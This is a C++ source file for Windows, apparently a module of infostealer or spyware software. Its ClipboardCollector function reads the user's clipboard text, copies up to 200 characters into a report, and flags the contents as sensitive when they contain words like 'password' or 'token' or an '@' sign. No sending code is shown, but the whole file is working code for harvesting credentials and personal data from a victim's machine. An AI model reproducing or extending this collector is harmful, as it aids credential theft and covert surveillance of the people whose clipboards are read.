#include "clipboard_collector.h"
#include <Windows.h>
#include <iostream>
#include <sstream>

std::string ClipboardCollector::CollectClipboard() {
    std::ostringstream result;
    result << "\n=== CLIPBOARD ===\n";
    
    if (!OpenClipboard(NULL)) {
        result << "Failed to open clipboard\n";
        return result.str();
    }
    
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData != NULL) {
        char* pszText = static_cast<char*>(GlobalLock(hData));
        if (pszText != NULL) {
            std::string clipboardText = pszText;
            if (!clipboardText.empty()) {
                result << "Clipboard content (" << clipboardText.length() << " bytes):\n";
                
                if (clipboardText.length() > 200) {
                    result << clipboardText.substr(0, 200) << "...\n";
                } else {
                    result << clipboardText << "\n";
                }
                
                if (clipboardText.find("password") != std::string::npos ||
                    clipboardText.find("Password") != std::string::npos ||
                    clipboardText.find("@") != std::string::npos ||
                    clipboardText.find("token") != std::string::npos ||
                    clipboardText.find("Token") != std::string::npos) {
                    result << ">>> CONTAINS SENSITIVE DATA! <<<\n";
                }
            }
            GlobalUnlock(hData);
        }
    }
    
    CloseClipboard();
    
    return result.str();
}
